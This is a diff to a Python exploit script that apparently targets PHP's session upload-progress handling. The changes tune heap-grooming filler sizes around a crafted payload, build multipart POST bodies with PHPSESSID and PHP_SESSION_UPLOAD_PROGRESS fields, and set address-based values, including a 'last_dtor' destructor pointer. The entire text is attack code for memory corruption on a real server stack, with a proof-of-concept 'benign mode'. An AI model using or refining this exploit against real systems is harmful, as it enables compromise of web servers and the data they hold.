@@ -132,7 +132,7 @@ def main():
         import groom as g0
         base = 0xfa2f0ea6a000
         payload = g0.build_payload(base, bias + 0xf22000, bias)
-        comb = b"F" * 1323008 + payload
+        comb = b"F" * 12288 + payload + b"F" * 4096
         log(f"place: comb={len(comb)}B filler=430080 payload_base=0xfa2f0ea6a000(expected)")
         cons = pb([part(b"g", comb),
                    part(b"PHPSESSID", sid_b.encode()),
@@ -155,9 +155,9 @@ def main():
         return
     s = socket.create_connection((HOST, PORT), timeout=30)
     s = socket.create_connection((HOST, PORT), timeout=30)
-    prod = pb([part(b"f", b"F" * 430080),
+    prod = pb([part(b"f", b"F" * 24576 + b"X" * 8192),
                part(b"PHPSESSID", sid_a.encode()),
-               part(b"PHP_SESSION_UPLOAD_PROGRESS", b"poc"),
+               part(b"PHP_SESSION_UPLOAD_PROGRESS", b"poc2"),
                part(b"u", b"x" * 10, filename=b"a.txt")])
     r, dt = send(s, post_head(len(prod)), prod, timeout=120)
     body = r.split(b"\r\n\r\n", 1)[1] if b"\r\n\r\n" in r else r
@@ -233,7 +233,7 @@ def main():
         struct.pack_into("<Q", payload, 16, ld)    # last_dtor
         payload = bytes(payload)
         log(f"benign mode: dtor ptrs -> {ld:#x}, token poc|i:1;")
-    comb = b"F" * 1323008 + payload
+    comb = b"F" * 12288 + payload + b"F" * 4096
     cons = pb([part(b"g", comb),
                part(b"PHPSESSID", sid_b.encode()),
                part(b"PHP_SESSION_UPLOAD_PROGRESS", b"poc2"),
